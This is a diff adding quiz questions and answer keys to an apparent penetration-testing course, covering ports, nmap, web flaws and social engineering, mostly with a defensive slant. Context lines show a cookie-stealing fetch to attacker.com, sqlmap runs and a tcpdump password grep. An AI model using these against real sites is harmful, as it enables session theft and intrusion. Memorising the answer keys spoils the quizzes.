+                  explanation: "SMTP sends mail, while IMAP and POP3 are used to read it. Checking each in turn is how you find where an email problem sits."
+                },
+                {
+                  id: 'p3r3-q4b',
+                  question: "Why is email spoofing possible with basic SMTP?",
+                  options: [
+                    "Email is never encrypted by anyone",
+                    "Only administrators can send email",
+                    "SMTP on its own does not check that the From address is real",
+                    "SMTP does not need a server"
+                  ],
+                  correctIndex: 2,
+                  explanation: "Anyone can type any From address when talking to a mail server. This is why attackers can pretend to be your boss, and why protections such as SPF and DKIM were added."
                 }
               ]
             }
@@ -3035,6 +3683,30 @@ When analyzing a compromised network:
                   options: ['To make network faster', 'To read and analyze network traffic', 'To block all traffic', 'To encrypt data'],
                   correctIndex: 1,
                   explanation: 'Packet analysis (sniffing) captures and examines network traffic to find patterns, extract data, or detect malicious activity.'
+                },
+                {
+                  id: 'p3r4-q1a',
+                  question: "An outside scan shows port 3306 open to the internet. What is it, and why is it a concern?",
+                  options: [
+                    "SSH, because it uses a weak password",
+                    "DNS, because it is slow",
+                    "HTTP, because it has no encryption",
+                    "MySQL, because databases should normally not be reachable from the internet"
+                  ],
+                  correctIndex: 3,
+                  explanation: "3306 is MySQL. A database holds the most valuable data, so exposing it lets attackers try to guess passwords or use known flaws. Database ports should usually be open only to the application server."
+                },
+                {
+                  id: 'p3r4-q1b',
+                  question: "Which pairing of port and service is correct?",
+                  options: [
+                    "22 = SSH",
+                    "25 = DNS",
+                    "80 = HTTPS",
+                    "21 = SMTP"
+                  ],
+                  correctIndex: 0,
+                  explanation: "The right pairs are 21 = FTP, 22 = SSH, 25 = SMTP, 53 = DNS, 80 = HTTP and 443 = HTTPS. Knowing them lets you guess what a service is when you see a port number in a scan."
                 }
               ]
             },
@@ -3143,6 +3815,30 @@ tcpdump -A -r capture.pcap port 80 | grep -i "password"
                   options: ['Saves automatically', 'Shows packet content in ASCII (readable text)', 'Speeds up capture', 'Encrypts output'],
                   correctIndex: 1,
                   explanation: 'The -A flag displays packet payload in ASCII, making text data like passwords or web content readable.'
+                },
+                {
+                  id: 'p3r4-q2a',
+                  question: "What does nmap -p 80,443 target do?",
+                  options: [
+                    "Scans all ports except 80 and 443",
+                    "Scans only ports 80 and 443 on the target",
+                    "Blocks ports 80 and 443",
+                    "Downloads the web pages"
+                  ],
+                  correctIndex: 1,
+                  explanation: "The -p option picks which ports to scan. Scanning only the ports you care about is much faster. Only scan targets you have permission to test."
+                },
+                {
+                  id: 'p3r4-q2b',
+                  question: "nmap shows port 25 as filtered. What does that usually mean?",
+                  options: [
+                    "The port is open",
+                    "The port is closed and nothing listens",
+                    "A firewall is blocking the probes, so nmap cannot tell if it is open",
+                    "The port is encrypted"
+                  ],
+                  correctIndex: 2,
+                  explanation: "Open means a service answered and closed means the machine said nothing is there. Filtered means no clear answer came back, often because a firewall dropped the packets."
                 }
               ]
             },
@@ -3244,6 +3940,30 @@ Shows entire conversation between two hosts.`,
                   options: ['They are too slow', 'They send data in plaintext without encryption', 'They are outdated', 'They require passwords'],
                   correctIndex: 1,
                   explanation: 'These protocols send data unencrypted, making credentials and sensitive information visible to anyone capturing traffic.'
+                },
+                {
+                  id: 'p3r4-q3a',
+                  question: "You want to find which hosts on a network are alive, without scanning their ports. Which option do you use?",
+                  options: [
+                    "-sS",
+                    "-sU",
+                    "-sT",
+                    "-sn"
+                  ],
+                  correctIndex: 3,
+                  explanation: "-sn is a ping scan: it only checks which hosts respond. It is a quick first step before deeper scans on the machines that are up."
+                },
+                {
+                  id: 'p3r4-q3b',
+                  question: "Why does nmap -sS usually need sudo or root?",
+                  options: [
+                    "It builds raw packets by hand, which needs administrator rights",
+                    "It scans UDP ports",
+                    "It deletes logs on the target",
+                    "It only works on Kali"
+                  ],
+                  correctIndex: 0,
+                  explanation: "The SYN scan sends custom packets instead of normal connections. Without admin rights nmap falls back to the connect scan (-sT)."
                 }
               ]
             },
@@ -3302,6 +4022,30 @@ Statistics → Conversations
                   options: ['Normal traffic', 'A port scan or network reconnaissance', 'Encrypted communication', 'File transfer'],
                   correctIndex: 1,
                   explanation: 'Many SYN packets to different ports is the signature of a port scan - someone is probing which ports are open.'
+                },
+                {
+                  id: 'p3r4-q4a',
+                  question: "You want a slow, quiet scan to avoid setting off an intrusion detection system. Which option is the best fit?",
+                  options: [
+                    "-T5",
+                    "-T1",
+                    "-T4",
+                    "-T3"
+                  ],
+                  correctIndex: 1,
+                  explanation: "Timing goes from T0 (slowest) to T5 (fastest). Slow templates send packets with long pauses, which is harder to notice. T3 is the default."
+                },
+                {
+                  id: 'p3r4-q4b',
+                  question: "Why should you be careful about using -T5 on a real client network?",
+                  options: [
+                    "It makes the scan more accurate",
+                    "It is required for every scan",
+                    "Very fast scans can overload fragile devices, miss results and are easy to detect",
+                    "It hides your IP address"
+                  ],
+                  correctIndex: 2,
+                  explanation: "A scan that is too fast can slow or even crash weak equipment like old routers and printers. Causing damage goes against the do-no-harm rule, so pick speed to match the network."
                 }
               ]
             }
@@ -3411,6 +4155,30 @@ curl -X DELETE http://target.com/user/1
                   options: ['POST', 'GET', 'DELETE', 'PUT'],
                   correctIndex: 1,
                   explanation: 'GET retrieves data from the server. POST sends data, PUT updates, and DELETE removes data.'
+                },
+                {
+                  id: 'p4r1-q1a',
+                  question: "When you open a website, which side runs the code that talks to the database?",
+                  options: [
+                    "Your browser",
+                    "Your router",
+                    "The server (the backend)",
+                    "The keyboard you type on"
+                  ],
+                  correctIndex: 2,
+                  explanation: "Your browser (the client) shows the page and sends requests. The server runs the backend code, applies the rules and holds the data. A hacker's main target is usually the server, because that is where the valuable data lives."
+                },
+                {
+                  id: 'p4r1-q1b',
+                  question: "A shop checks that the quantity field is a positive number only with JavaScript in the browser. Why is that a weakness?",
+                  options: [
+                    "Browsers refuse to send negative numbers",
+                    "JavaScript checks are always encrypted",
+                    "The server fixes bad values by itself",
+                    "An attacker controls their own browser and can send a different value straight to the server, so the server must check too"
+                  ],
+                  correctIndex: 3,
+                  explanation: "Anything running in the browser can be bypassed, because the client belongs to the user. Browser checks are only for convenience. Real security checks must happen on the server."
                 }
               ]
             },
@@ -3522,6 +4290,30 @@ User-Agent: iPhone...
                   options: ['Nothing useful', 'Server software version (useful for finding exploits)', 'User passwords', 'Cookie values'],
                   correctIndex: 1,
                   explanation: 'The Server header reveals the web server software and version, helping attackers find known vulnerabilities for that specific version.'
+                },
+                {
+                  id: 'p4r1-q2a',
+                  question: "A tester finds that DELETE /api/users/15 works even when not logged in. What is the problem?",
+                  options: [
+                    "Anyone can delete user accounts, because the server is not checking who is allowed to do it",
+                    "Nothing, DELETE is harmless",
+                    "The method should be GET instead",
+                    "The server is using HTTPS the wrong way"
+                  ],
+                  correctIndex: 0,
+                  explanation: "DELETE removes data, so the server must make sure only authorized users can use it. Testing which methods a URL allows, and who can use them, is a basic part of web testing."
+                },
+                {
+                  id: 'p4r1-q2b',
+                  question: "A site deletes your account when you open a plain link that uses the GET method. Why is that a bad design?",
+                  options: [
+                    "GET is slower than POST",
+                    "GET should not change data, and any link, image or page prefetch could trigger it by accident or on purpose",
+                    "GET cannot be used with HTTPS",
+                    "Links cannot contain account names"
+                  ],
+                  correctIndex: 1,
+                  explanation: "GET is meant for reading. If a GET link makes a change, someone can trick your browser into opening it. Actions that change data should use POST, PUT or DELETE, with protection against forged requests."
                 }
               ]
             },
@@ -3632,6 +4424,30 @@ export HTTP_PROXY=http://127.0.0.1:8080
                   options: ['Speed up browsing', 'Intercept and modify HTTP requests/responses', 'Block advertisements', 'Encrypt traffic'],
                   correctIndex: 1,
                   explanation: 'A web proxy sits between your browser and the server, letting you intercept, view, and modify HTTP traffic in real-time.'
+                },
+                {
+                  id: 'p4r1-q3a',
+                  question: "What does a session cookie do?",
+                  options: [
+                    "It stores your password in plain text",
+                    "It makes the website load faster",
+                    "It holds an ID that tells the server which logged-in user you are",
+                    "It blocks hackers from the site"
+                  ],
+                  correctIndex: 2,
+                  explanation: "HTTP forgets you after each request, so the site gives you a session ID in a cookie. Your browser sends it back every time, and that is how the server knows you are still logged in."
+                },
+                {
+                  id: 'p4r1-q3b',
+                  question: "Why is an easy-to-guess session ID dangerous?",
+                  options: [
+                    "It makes the cookie expire",
+                    "It makes the server crash",
+                    "It only affects the speed of the site",
+                    "Anyone who guesses or steals it can act as that user, which is called session hijacking"
+                  ],
+                  correctIndex: 3,
+                  explanation: "The session ID works like a temporary password. Good sites use long random IDs, send them only over HTTPS and mark them HttpOnly so scripts cannot read them."
                 }
               ]
             }
@@ -3709,6 +4525,30 @@ curl http://target.com/api/users/2
                   options: ['Slow website', 'Viewing another user\'s data by changing an ID in the URL', 'Forgotten password', 'CSS styling error'],
                   correctIndex: 1,
                   explanation: 'Broken Access Control means users can access resources they should not have permission to view, like changing ?id=1 to ?id=2 to see someone else\'s data.'
+                },
+                {
+                  id: 'p4r2-q1a',
+                  question: "A response header says Server: Apache/2.2.8. Why does this help a tester?",
+                  options: [
+                    "It shows the software and version, which can be checked for known vulnerabilities",
+                    "It gives the admin password",
+                    "It proves the site is secure",
+                    "It shows who visited the site"
+                  ],
+                  correctIndex: 0,
+                  explanation: "Headers carry information about the request or response. Version details help you decide what to test, and that is why many sites hide or shorten them."
+                },
+                {
+                  id: 'p4r2-q1b',
+                  question: "Which header carries your session cookie from the browser to the server on each request?",
+                  options: [
+                    "Server",
+                    "Cookie",
+                    "Content-Type",
+                    "Host"
+                  ],
+                  correctIndex: 1,
+                  explanation: "The server gives you the cookie with a Set-Cookie header, and your browser returns it in the Cookie header every time. Testers often look at this header to see how sessions are handled."
                 }
               ]
             },
@@ -3798,6 +4638,30 @@ Try special characters: \`' " ; | & < > ( ) { }\``,
                   options: ['Change CSS styling', 'Directly interact with the database', 'Speed up queries', 'Fix bugs'],
                   correctIndex: 1,
                   explanation: 'SQL Injection lets attackers insert malicious SQL code to read, modify, or delete database data, often bypassing authentication.'
+                },
+                {
+                  id: 'p4r2-q2a',
+                  question: "What is the difference between authentication and authorization?",
+                  options: [
+                    "Authentication checks what you can do, and authorization checks who you are",
+                    "They mean the same thing",
+                    "Authentication checks who you are, and authorization checks what you are allowed to do",
+                    "Authentication is for passwords and authorization is for emails"
+                  ],
+                  correctIndex: 2,
+                  explanation: "Logging in proves your identity (authentication). After that, the server must still decide which data and actions you may use (authorization). Many serious bugs are missing authorization checks."
+                },
+                {
+                  id: 'p4r2-q2b',
+                  question: "A login page says User not found for a wrong username, and Wrong password for a wrong password. Why is that a weakness?",
+                  options: [
+                    "It makes logging in slower",
+                    "It reveals the admin password",
+                    "It breaks the cookie",
+                    "It lets an attacker find out which usernames exist"
+                  ],
+                  correctIndex: 3,
+                  explanation: "Different messages let an attacker test names until they find real accounts, and then they only need to guess the passwords. A safer message is the same for both cases, such as Invalid username or password."
                 }
               ]
             },
@@ -3893,6 +4757,30 @@ sqlmap -u "http://target.com/page?id=1"
                   options: ['Manual testing is faster', 'Manual testing finds business logic flaws and complex issues that scanners miss', 'Scanners don\'t work', 'Manual testing is required by law'],
                   correctIndex: 1,
                   explanation: 'Automated scanners miss business logic flaws, complex attack chains, and context-specific vulnerabilities. Manual testing is essential for thorough assessment.'
+                },
+                {
+                  id: 'p4r2-q3a',
+                  question: "GET /api/users/5 shows your profile. You change 5 to 6 and see another person's profile. What is the problem?",
+                  options: [
+                    "The API does not check that you are allowed to view that user, which is broken access control",
+                    "That is normal behavior",
+                    "The profile page is slow",
+                    "The URL is too short"
+                  ],
+                  correctIndex: 0,
+                  explanation: "The server should check that the logged-in user owns the data they ask for. Changing IDs in endpoints is one of the first things testers try on an API. Test only systems you are allowed to test."
+                },
+                {
+                  id: 'p4r2-q3b',
+                  question: "Why do testers look for hidden or undocumented API endpoints?",
+                  options: [
+                    "They always run faster",
+                    "They are often less protected than the ones the app normally uses",
+                    "They are required for HTTPS",
+                    "They cannot be attacked"
+                  ],
+                  correctIndex: 1,
+                  explanation: "Developers sometimes leave old, test or admin endpoints with weaker checks. These are easy to forget when everyone focuses on the visible ones."
                 }
               ]
             }
@@ -3947,6 +4835,30 @@ You're logged in as first user (usually admin)
                   options: ['It deletes the database', 'It makes the WHERE condition always true', 'It encrypts the password', 'It creates a new user'],
                   correctIndex: 1,
                   explanation: 'OR \'1\'=\'1 creates a condition that is always true, making the query return all users and bypassing the password check.'
+                },
+                {
+                  id: 'p4r3-q1a',
+                  question: "What does SELECT * FROM users WHERE id = 5 do?",
+                  options: [
+                    "Deletes user 5",
+                    "Creates a new user with id 5",
+                    "Gets all the columns for the user whose id is 5",
+                    "Changes the password of user 5"
+                  ],
+                  correctIndex: 2,
+                  explanation: "SELECT reads data. The * means all columns, FROM names the table and WHERE filters the rows. Understanding normal queries is the first step to understanding how they can be abused."
+                },
+                {
+                  id: 'p4r3-q1b',
+                  question: "Where is data such as usernames and password hashes stored on most websites?",
+                  options: [
+                    "Only in your browser cookies",
+                    "In the URL",
+                    "In your router",
+                    "In a database on the server"
+                  ],
+                  correctIndex: 3,
+                  explanation: "The backend keeps account data in database tables. That makes the database a main target, so any bug that lets users change a database query is serious."
                 }
               ]
             },
@@ -4047,6 +4959,30 @@ Oracle:   --
                   options: ['Deletes data', 'Comments out the rest of the query', 'Encrypts the query', 'Creates a backup'],
                   correctIndex: 1,
                   explanation: '-- is a SQL comment that ignores everything after it, allowing attackers to remove parts of the query like password checks.'
+                },
+                {
+                  id: 'p4r3-q2a',
+                  question: "A search box builds its SQL query by pasting the user's text into it. What is the root cause of SQL injection?",
+                  options: [
+                    "User input is mixed into the query as code instead of being treated only as data",
+                    "The database is too old",
+                    "The website uses HTTPS",
+                    "The search box is too small"
+                  ],
+                  correctIndex: 0,
+                  explanation: "When the input becomes part of the command, a user can change what the query does. The fix is to keep code and data separate."
+                },
+                {
+                  id: 'p4r3-q2b',
+                  question: "Which defense best stops SQL injection?",
+                  options: [
+                    "Hiding the error messages only",
+                    "Prepared statements (parameterized queries)",
+                    "Blocking the word SELECT only",
+                    "Making the form look different"
+                  ],
+                  correctIndex: 1,
+                  explanation: "A prepared statement sends the query and the input separately, so the input can never turn into SQL. Hiding errors or blocking words only makes attacks a little harder, and they are easy to work around."
                 }
               ]
             },
@@ -4157,6 +5093,30 @@ sqlmap -r request.txt
                   options: ['It is required by law', 'It automates the detection and exploitation of SQL injection', 'It fixes the vulnerability', 'It encrypts the database'],
                   correctIndex: 1,
                   explanation: 'SQLMap automates the tedious process of detecting and exploiting SQL injection, testing multiple techniques and extracting data automatically.'
+                },
+                {
+                  id: 'p4r3-q3a',
+                  question: "A comment box shows whatever users type without cleaning it. What could an attacker's comment do?",
+                  options: [
+                    "Delete the database directly",
+                    "Shut down the server",
+                    "Contain a script that runs in every visitor's browser, for example to steal session cookies",
+                    "Change the visitors' Wi-Fi password"
+                  ],
+                  correctIndex: 2,
+                  explanation: "This is cross-site scripting (XSS). The attacker's code runs inside the trusted site, so it can read page data and act as the visitor."
+                },
+                {
+                  id: 'p4r3-q3b',
+                  question: "Which is the best defense against XSS?",
+                  options: [
+                    "Make the page load faster",
+                    "Hide the comment box",
+                    "Ask users to log in twice",
+                    "Encode user input when showing it, so it appears as text and never runs as code"
+                  ],
+                  correctIndex: 3,
+                  explanation: "Output encoding turns characters like < and > into harmless text. A Content Security Policy adds another layer by limiting which scripts the browser may run."
                 }
               ]
             },
@@ -4265,6 +5225,30 @@ Result: Alert box pops up
                   options: ['Delete the database', 'Execute JavaScript in victim\'s browser', 'Scan ports', 'Crack passwords'],
                   correctIndex: 1,
                   explanation: 'XSS (Cross-Site Scripting) lets attackers inject malicious JavaScript that runs in other users\' browsers, stealing data or performing actions as them.'
+                },
+                {
+                  id: 'p4r4-q1a',
+                  question: "You are logged into your bank in one tab. A harmful page in another tab secretly sends a transfer request. Why might the bank accept it?",
+                  options: [
+                    "Your browser automatically attaches your session cookie to the request",
+                    "The bank turned off passwords",
+                    "The harmful page knows your password",
+                    "HTTPS was broken"
+                  ],
+                  correctIndex: 0,
+                  explanation: "This is cross-site request forgery (CSRF). The server sees a valid cookie and cannot tell that you did not mean to send the request."
+                },
+                {
+                  id: 'p4r4-q1b',
+                  question: "Which defense helps stop CSRF?",
+                  options: [
+                    "Using only longer passwords",
+                    "A secret random token in each form that the server checks",
+                    "Using HTTPS alone",
+                    "Turning off images"
+                  ],
+                  correctIndex: 1,
+                  explanation: "An attacker's page cannot know the secret token, so its forged request fails. HTTPS protects traffic on the way, but it does not stop forged requests."
                 }
               ]
             },
@@ -4365,6 +5349,30 @@ fetch('http://attacker.com/log?cookie='+document.cookie)
                   options: ['Reflected', 'Stored (affects all users)', 'DOM-based', 'They are all equally dangerous'],
                   correctIndex: 1,
                   explanation: 'Stored XSS is most dangerous because the payload is saved in the database and executes for every user who views the page, not just one victim.'
+                },
+                {
+                  id: 'p4r4-q2a',
+                  question: "A site lets you upload a profile picture but does not check the file. What is the main risk?",
+                  options: [
+                    "The picture may look blurry",
+                    "The site may load slowly",
+                    "An attacker could upload a script that the server runs, giving them control",
+                    "Users may upload duplicate files"
+                  ],
+                  correctIndex: 2,
+                  explanation: "If the server executes an uploaded file, the attacker's code runs on the server. This can lead to full compromise, so upload features are a favorite target."
+                },
+                {
+                  id: 'p4r4-q2b',
+                  question: "Which is the safest way to handle uploads?",
+                  options: [
+                    "Trust the file extension the browser sends",
+                    "Check the type only with JavaScript",
+                    "Allow all file types and warn users",
+                    "Check the type and size on the server, rename the file and store it where it cannot be executed"
+                  ],
+                  correctIndex: 3,
+                  explanation: "Only server-side checks count, because a client can send anything. Renaming the file and storing it away from executable paths adds another layer."
                 }
               ]
             },
@@ -4447,6 +5455,30 @@ Browsers automatically send cookies with requests. The bank can't tell if the re
                   options: ['By stealing passwords', 'By tricking users into making unwanted requests using their active session', 'By deleting cookies', 'By injecting SQL'],
                   correctIndex: 1,
                   explanation: 'CSRF exploits the trust a website has in the user\'s browser, making requests on their behalf using their valid session/cookies.'
+                },
+                {
+                  id: 'p4r4-q3a',
+                  question: "A site has a ping this host tool that passes your input to the system shell. What is the risk?",
+                  options: [
+                    "An attacker can add extra commands to the input, and the server runs them",
+                    "The tool will ping too slowly",
+                    "The tool will show the wrong IP",
+                    "Nothing, ping is safe"
+                  ],
+                  correctIndex: 0,
+                  explanation: "Characters like ; & and | can chain commands in a shell. If the input is not controlled, the attacker's commands run with the server's privileges."
+                },
+                {
+                  id: 'p4r4-q3b',
+                  question: "What is the best fix for command injection?",
+                  options: [
+                    "Remove only the semicolon from the input",
+                    "Avoid calling the shell with user input, use safe built-in functions, and accept only values from an allowed list",
+                    "Make the input box shorter",
+                    "Hide the tool from the menu"
+                  ],
+                  correctIndex: 1,
+                  explanation: "Blocking a few characters is easy to get around. The safest design never builds shell commands from user input in the first place."
                 }
               ]
             },
@@ -4562,6 +5594,30 @@ admin:123456
                   options: ['admin', 'password', '123456', 'All of these are equally common'],
                   correctIndex: 3,
                   explanation: 'All three are extremely common weak passwords. Always test these default/common passwords first when assessing authentication.'
+                },
+                {
+                  id: 'p4r5-q1a',
+                  question: "A site loads files with /download?file=report.pdf. Why can ../../ in the file value be dangerous?",
+                  options: [
+                    "It makes the download faster",
+                    "It only changes the file name",
+                    "It can climb out of the intended folder and reach other files, like system files",
+                    "It logs the user out"
+                  ],
+                  correctIndex: 2,
+                  explanation: "../ means go up one folder. Several of them can reach folders the site was never meant to share. This is called directory traversal or path traversal."
+                },
+                {
+                  id: 'p4r5-q1b',
+                  question: "Which is the best defense against directory traversal?",
+                  options: [
+                    "Hide the download link",
+                    "Rename the folder",
+                    "Block only the .. characters once",
+                    "Do not build paths from user input, allow only known file names, and check the final path stays inside the allowed folder"
+                  ],
+                  correctIndex: 3,
+                  explanation: "Checking the final resolved path is the strongest approach. Simple filters are often tricked by different spellings of the same path."
                 }
               ]
             },
@@ -4665,6 +5721,30 @@ session=admin_20241102
                   options: ['Deleting sessions', 'Stealing or guessing a valid session ID to impersonate a user', 'Creating new sessions', 'Logging out users'],
                   correctIndex: 1,
                   explanation: 'Session hijacking involves stealing or predicting a valid session ID, allowing the attacker to impersonate the legitimate user without knowing their password.'
+                },
+                {
+                  id: 'p4r5-q2a',
+                  question: "What does a proxy tool like Burp Suite let you do?",
+                  options: [
+                    "Sit between your browser and the server so you can see, pause and change requests",
+                    "Make websites load faster",
+                    "Hide your computer from the internet",
+                    "Write the final report for you"
+                  ],
+                  correctIndex: 0,
+                  explanation: "With a proxy, every request passes through your tool before reaching the server. That lets you inspect them and change values the browser would not normally let you edit. Use it only on sites you have permission to test."
+                },
+                {
+                  id: 'p4r5-q2b',
+                  question: "A modern site makes many requests behind the scenes that you cannot see on the page. How does a proxy help?",
+                  options: [
+                    "It blocks the hidden requests",
+                    "It shows every request and response, including the hidden ones",
+                    "It encrypts the page",
+                    "It turns off JavaScript"
+                  ],
+                  correctIndex: 1,
+                  explanation: "The page only shows part of what happens. A proxy history shows the full conversation with the server, including API calls and cookies, which is where many weaknesses are found."
                 }
               ]
             },
@@ -4788,6 +5868,30 @@ done
                   options: ['SMS codes', 'Email codes', 'Hardware keys (YubiKey)', 'Security questions'],
                   correctIndex: 2,
                   explanation: 'Hardware keys like YubiKey are the strongest because they cannot be phished, intercepted, or duplicated easily, unlike SMS or email codes.'
+                },
+                {
+                  id: 'p4r5-q3a',
+                  question: "You want to find hidden pages like /admin or /backup on a site you are allowed to test. Which approach fits?",
+                  options: [
+                    "Guess one page by hand each day",
+                    "Wait for the site to list them",
+                    "Fuzz the URL with a wordlist of common names and see which ones answer",
+                    "Scan the router instead"
+                  ],
+                  correctIndex: 2,
+                  explanation: "Fuzzing sends lots of automatic requests with different inputs. With a wordlist it can check thousands of names in minutes. Keep it inside the scope and do not overload the server."
+                },
+                {
+                  id: 'p4r5-q3b',
+                  question: "During fuzzing, one response has a different status code and length from all the others. What do you do?",
+                  options: [
+                    "Ignore it",
+                    "Delete it from the results",
+                    "Report it without checking",
+                    "Look at it by hand, because the difference may point to something interesting"
+                  ],
+                  correctIndex: 3,
+                  explanation: "Fuzzing finds candidates, and a human decides what they mean. A response that stands out from the rest often hints at a hidden page or a bug."
                 }
               ]
             },
@@ -4966,6 +6070,30 @@ Resend from similar address
                   options: ['It uses advanced technology', 'It exploits human psychology and trust', 'It is faster than computers', 'It is legal'],
                   correctIndex: 1,
                   explanation: 'Social engineering exploits human psychology - trust, fear, urgency, helpfulness - rather than technical vulnerabilities.'
+                },
+                {
+                  id: 'p5r1-q1a',
+                  question: "Why is social engineering often easier than technical hacking?",
+                  options: [
+                    "People can be tricked even when the technology is strong",
+                    "Computers are always weaker than people",
+                    "It needs expensive tools",
+                    "It is always legal"
+                  ],
+                  correctIndex: 0,
+                  explanation: "A strong firewall cannot stop someone from simply giving away their password. Attackers go after trust, habit and good manners, which is why people are called the weakest link."
+                },
+                {
+                  id: 'p5r1-q1b',
+                  question: "A message says Do this in 10 minutes or your account will be deleted. Which trick is it using?",
+                  options: [
+                    "Patience",
+                    "Urgency, which pushes you to act before you think",
+                    "Technical jargon",
+                    "Free software"
+                  ],
+                  correctIndex: 1,
+                  explanation: "Urgency and fear make people skip checks. Authority, such as pretending to be a boss, works in a similar way. A real organization rarely demands instant action through a surprise message."
                 }
               ]
             },
@@ -5087,6 +6215,30 @@ github.com search
                   options: ['Testing text messages', 'Creating a fake but believable scenario to manipulate targets', 'Writing code before planning', 'Sending phishing emails'],
                   correctIndex: 1,
                   explanation: 'Pretexting is creating a believable scenario or fake identity (like pretending to be IT support) to manipulate targets into giving up information or access.'
+                },
+                {
+                  id: 'p5r1-q2a',
+                  question: "You get an email from Support saying your account will be locked unless you click a link. What is the best first step?",
+                  options: [
+                    "Click the link quickly",
+                    "Forward it to all your friends",
+                    "Do not click it. Go to the real website directly or contact them through a known channel",
+                    "Reply with your password"
+                  ],
+                  correctIndex: 2,
+                  explanation: "Typing the address yourself or using a saved bookmark avoids the fake page. Pressure to act fast is a classic sign of phishing."
+                },
+                {
+                  id: 'p5r1-q2b',
+                  question: "Which is a strong sign that an email is phishing?",
+                  options: [
+                    "It was sent on a weekday",
+                    "It has no pictures",
+                    "It has a signature",
+                    "The link's real address differs from what the text says"
+                  ],
+                  correctIndex: 3,
+                  explanation: "Hovering over a link shows where it really goes. A slightly wrong sender address, like a number replacing a letter, is another common sign."
                 }
               ]
             },
@@ -5198,6 +6350,30 @@ Network segmentation (limit damage)
                   options: ['Stronger passwords', 'User awareness training', 'Better antivirus', 'Faster computers'],
                   correctIndex: 1,
                   explanation: 'User awareness is the best defense because social engineering targets people, not systems. Trained users can recognize and report attacks.'
+                },
+                {
+                  id: 'p5r1-q3a',
+                  question: "A caller says they are from IT doing a security audit and asks for your employee ID. Which technique is this?",
+                  options: [
+                    "Pretexting, using a made-up story to gain trust",
+                    "Port scanning",
+                    "Tailgating",
+                    "Fuzzing"
+                  ],
+                  correctIndex: 0,
+                  explanation: "In pretexting the attacker invents a believable identity and reason. The safe move is to verify the caller through an official number before sharing anything."
+                },
+                {
+                  id: 'p5r1-q3b',
+                  question: "What makes a pretext convincing?",
+                  options: [
+                    "Speaking very loudly",
+                    "Real details about the target, found through research",
+                    "Asking for everything at once",
+                    "Using the hardest technical words"
+                  ],
+                  correctIndex: 1,
+                  explanation: "Knowing names, roles and company details makes the story feel genuine. Research is why public information about staff and companies matters so much."
                 }
               ]
             }
@@ -5309,6 +6485,30 @@ site:blob.core.windows.net "company"
                   options: ['Hacks PDF files', 'Finds all PDFs on target.com', 'Converts files to PDF', 'Deletes PDFs'],
                   correctIndex: 1,
                   explanation: 'This Google dork searches for all PDF files hosted on target.com, useful for finding documents, presentations, and reports.'
+                },
+                {
+                  id: 'p5r2-q1a',
+                  question: "Which of these is OSINT?",
+                  options: [
+                    "Breaking into the company's email",
+                    "Guessing passwords",
+                    "Reading a company's public website, job posts and press releases",
+                    "Scanning the company's servers"
+                  ],
+                  correctIndex: 2,
+                  explanation: "OSINT means open source intelligence, which is information anyone can legally find in public. The other options touch the target's systems directly and need permission."
+                },
+                {
+                  id: 'p5r2-q1b',
+                  question: "Why is OSINT usually the first step in an assessment?",
+                  options: [
+                    "It gives immediate admin access",
+                    "It replaces the report",
+                    "It is the only legal step",
+                    "It uses public information, does not touch the target and helps plan the next steps"
+                  ],
+                  correctIndex: 3,
+                  explanation: "Because OSINT is passive, the target does not notice it. What you find, such as names, tools and email formats, makes the later steps more focused."
                 }
               ]
             },
@@ -5440,6 +6640,30 @@ apache country:"US"
                   options: ['A hacking tool', 'A search engine for internet-connected devices', 'A VPN service', 'An antivirus'],
                   correctIndex: 1,
                   explanation: 'Shodan is a search engine that finds internet-connected devices (servers, cameras, routers, etc.) and exposed services, useful for reconnaissance.'
+                },
+                {
+                  id: 'p5r2-q2a',
+                  question: "An employee posts a photo at their desk. What could an attacker learn from it?",
+                  options: [
+                    "Badge design, what is on the screens and notes stuck on the monitor",
+                    "Nothing useful",
+                    "The company's firewall rules",
+                    "The server's password hashes"
+                  ],
+                  correctIndex: 0,
+                  explanation: "Small details in photos can reveal the software in use, the layout of the office or even passwords on sticky notes. Staff should think before posting work-area photos."
+                },
+                {
+                  id: 'p5r2-q2b',
+                  question: "Which public information from a professional profile helps an attacker most when building a pretext?",
+                  options: [
+                    "The font on the page",
+                    "Names, job titles and who works with whom",
+                    "The number of likes",
+                    "The profile's color theme"
+                  ],
+                  correctIndex: 1,
+                  explanation: "Titles and relationships make it easy to pretend to be a colleague or manager. Limiting what is public and tightening privacy settings reduces the risk."
                 }
               ]
             },
@@ -5582,6 +6806,30 @@ Create report:
                   options: ['It is required by law', 'It helps understand the target and find attack surface without alerting them', 'It replaces penetration testing', 'It is faster than scanning'],
                   correctIndex: 1,
                   explanation: 'OSINT provides crucial intelligence about the target (technology, people, structure) before active testing, helping focus efforts and avoid detection during reconnaissance.'
+                },
+                {
+                  id: 'p5r2-q3a',
+                  question: "Why might an attacker try physical access instead of an online attack?",
+                  options: [
+                    "Physical access is always legal",
+                    "Online defenses do not exist",
+                    "Plugging into a network port or finding an unlocked computer can skip online defenses",
+                    "It is always faster to travel"
+                  ],
+                  correctIndex: 2,
+                  explanation: "Strong network security does not help if someone can sit down at an unlocked machine. Locks, badges and cameras protect the technology from the physical side."
+                },
+                {
+                  id: 'p5r2-q3b',
+                  question: "You find a USB drive in the parking lot. What should you do?",
+                  options: [
+                    "Plug it in to find the owner",
+                    "Format it and keep it",
+                    "Post a photo online",
+                    "Do not plug it in. Give it to the IT or security team"
+                  ],
+                  correctIndex: 3,
+                  explanation: "Attackers leave infected USB drives hoping curious people will plug them in. A drive can run malicious code as soon as it is connected."
                 }
               ]
             }
@@ -5687,6 +6935,30 @@ People assume you belong
                   options: ['Following cars', 'Following an authorized person through a secure door', 'A party at the office', 'Checking peoples\' badges'],
                   correctIndex: 1,
                   explanation: 'Tailgating is when an unauthorized person follows closely behind an authorized person through a secure entrance, bypassing access controls.'
+                },
+                {
+                  id: 'p5r3-q1a',
+                  question: "Someone carrying boxes asks you to hold the secure door open. What is the best response?",
+                  options: [
+                    "Politely ask them to badge in, or direct them to reception",
+                    "Hold the door, it would be rude not to",
+                    "Give them your badge",
+                    "Ignore them and run"
+                  ],
+                  correctIndex: 0,
+                  explanation: "Tailgating is following an authorized person through a secure door. Being polite and following the process protects everyone, and real staff will understand."
+                },
+                {
+                  id: 'p5r3-q1b',
+                  question: "Why do tailgating attempts so often work?",
+                  options: [
+                    "Badges never work",
+                    "People feel rude refusing to hold a door",
+                    "All doors are unlocked",
+                    "Cameras are always off"
+                  ],
+                  correctIndex: 1,
+                  explanation: "Attackers use good manners against you, for example by carrying boxes or looking busy. Training and a culture where it is okay to say no close this gap."
                 }
               ]
             },
@@ -5822,6 +7094,30 @@ Lock opens
